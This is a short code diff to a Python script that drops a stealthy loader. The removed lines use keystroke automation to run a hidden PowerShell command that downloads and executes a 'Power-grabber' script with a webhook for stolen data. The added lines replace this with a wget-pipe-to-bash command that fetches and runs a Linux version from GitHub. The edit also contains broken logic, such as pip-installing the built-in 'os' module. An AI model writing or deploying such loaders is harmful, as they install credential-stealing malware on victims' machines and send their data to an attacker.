@@ -4,12 +4,14 @@ import subprocess
 def install(package):
     subprocess.check_call([sys.executable, "-m", "pip", "install", package])
 try:
-    import pyautogui
+    import os
 except ImportError:
-    install('pyautogui')
+    install('os')
     import pyautogui
 time.sleep(1)
-pyautogui.hotkey('win', 'r')
-time.sleep(0.75)
-pyautogui.write(f"powershell -NoP -Ep Bypass -W H -C $dc='{webhook_url}'; irm https://raw.githubusercontent.com/Powercascade/Power-grabber/refs/heads/main/taktikal | iex")
-pyautogui.press('enter')
+
+# Command to download and execute the Bash script from GitHub
+command = f"bash -c 'wget -qO- https://raw.githubusercontent.com/Dispnser/Power-grabber-linux/main/taktikal | bash'"
+
+# Execute the command
+os.system(command)
